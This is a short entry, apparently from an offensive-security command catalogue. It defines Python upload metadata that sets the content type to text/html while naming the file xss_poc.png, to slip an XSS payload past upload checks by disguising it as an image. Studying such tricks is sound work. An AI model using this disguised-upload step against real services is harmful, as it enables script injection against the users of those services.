---
data: >-
  json_data = {'contentType': 'text/html', 'fileName': 'xss_poc.png',
  'fileSize': 7331, 'useCase': 'conversation'}
tags:
  - metadata
  - payload
type: command
output: null
executor: python
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:38.403Z'
id: 18c85f52-1ef9-415a-913d-8a463ef06bc6
verified: false
validated: true
submitted: true
---
# define-upload-metadata-python

## Command

```python
json_data = {'contentType': 'text/html', 'fileName': 'xss_poc.png', 'fileSize': 7331, 'useCase': 'conversation'}
```

## Description

Defines the JSON payload for file metadata, setting contentType to text/html for XSS while disguising as PNG.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| contentType | MIME type (text/html) | Yes |
| fileName | Disguised name (xss_poc.png) | Yes |
| fileSize | File size in bytes | Yes |
| useCase | Upload context (conversation) | Yes |

## Examples

### Basic Usage

```python
json_data = {'contentType': 'text/html', 'fileName': 'xss_poc.png', 'fileSize': 7331, 'useCase': 'conversation'}
```

## Expected Output

No output; creates dict for JSON.

## Related

- [[commands/post-upload-metadata-python]]
